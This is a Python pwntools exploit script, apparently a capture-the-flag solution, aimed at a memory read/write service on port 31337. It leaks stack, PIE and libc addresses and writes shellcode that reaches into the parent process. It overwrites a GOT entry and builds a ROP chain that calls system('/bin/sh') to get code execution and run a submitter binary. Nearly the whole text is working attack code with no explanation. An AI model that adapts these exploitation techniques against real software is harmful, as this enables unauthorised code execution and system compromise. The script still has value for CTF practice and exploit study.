from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

s = remote(HOST, int(PORT))
# s = process("./challenge")
def cmd(idx):
    s.sendlineafter(b"Choice:",str(idx).encode())

def write(addr,value):
    cmd(2)
    s.sendlineafter(b"Value: ",hex(value)[2:].encode())
    s.sendlineafter(b"Address: ",hex(addr)[2:].encode())

def read(addr):
    cmd(1)
    s.sendlineafter(b"Address: ",hex(addr)[2:])
    s.recvuntil(b"Value: ")
    return int(s.recvline().strip(),16)

def write_str(addr,value):
    l = len(value)
    for i in range(0,l,8):
        write(addr+i,int.from_bytes(value[i:i+8].ljust(8,b"\x00"),'little'))

def read_str(addr,size):
    res = b""
    for i in range(0,size,8):
        res += p64(read(addr+i))
    return res

stack = read(0)
success(hex(stack))

pie_stack = stack-0x100
pie = read(pie_stack)-0x1220
success(hex(pie))

init = pie+0x1349
usleep_got = pie + 0x3538
context.arch = "amd64"

readv_helper = pie + 0x148c
writev_helper = pie + 0x14fc

def call_(addr,rsi,rdx):
    shellcode = f'''
        mov rdi,r12;
        mov rax,{addr};
        mov rsi,{rsi};
        mov rdx,{rdx};
        call rax;
    '''
    return shellcode

def write_father(addr,value):
    l = len(value)
    shellcode = ''
    for i in range(0,l,8):
        shellcode += call_(
            writev_helper,
            addr+i,
            int.from_bytes(value[i:i+8].ljust(8,b"\x00"),'little')
            )
    return shellcode


ret_stack = stack - 0x130
libc = read(stack-0x70) - 0x29e40
success(hex(libc))
success(hex(ret_stack))

system = libc + 331120
sh = libc+1934968
pop_rdi = libc + 173029
shellcode = shellcraft.amd64.linux.getppid()
shellcode += '''
    mov r12,rax;
'''
shellcode += write_father(pie+0x3500,p64(pie+0x1570))
shellcode += write_father(ret_stack,
                          p64(pop_rdi+1) + p64(pop_rdi) + p64(sh) + p64(system)
                          )
shellcode += 'jmp $'
shellcode = asm(shellcode)
write_str(init,shellcode)
write(usleep_got,init)
s.sendline()
sleep(1)
s.sendline(b"3")
# cmd(3)
s.sendline(b"./submitter")
print(s.recvall(timeout=1))
# s.interactive()